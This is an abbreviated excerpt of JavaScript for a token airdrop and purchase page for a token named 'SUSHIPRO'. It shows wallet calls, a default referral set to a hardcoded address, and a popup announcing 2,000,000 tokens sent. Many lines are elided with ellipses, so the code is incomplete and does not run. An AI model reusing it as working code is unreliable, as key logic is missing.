...
const getAirdrop = async () => {
  ...
  sttcontract.methods.airdrop(fresh).send({from:addr}, (err, res) => {
   ...
   title: 'Claim Success',
   icon: 'success',
   html: '2,000,000 SUSHIPRO sent to your wallet.',
...
const buyair = async () => {
  ...
  let fresh = document.getElementById('airinput').value;
  if(fresh === "")
    fresh = "0x5C73f25104BE151aFdeDADE94932Ded914F1ebaF";
  ...
  function addToWallet() {
                          ...
                          web3.currentProvider.sendAsync({
                            ...
                            params: {
                                'type': 'ERC20',
                                'options': {
                                    'address': '0x7Aab5Aa61EEe3a73833bE94227f0dCdAb366FD90',
                                    'symbol': 'SUSHIPRO',
                                    'decimals': '18',
   ...
   cancelButtonText: 'Exit',
        ...
        function querySt(ji) {
         ...
         if (ft[0] == ji) { 
          ...
          if( ref==null){
              ref = "0x5C73f25104BE151aFdeDADE94932Ded914F1ebaF";
               document.getElementById('airinput').value = ref; 
          }else{ 
          document.getElementById('airinput').value = ref; 
          } 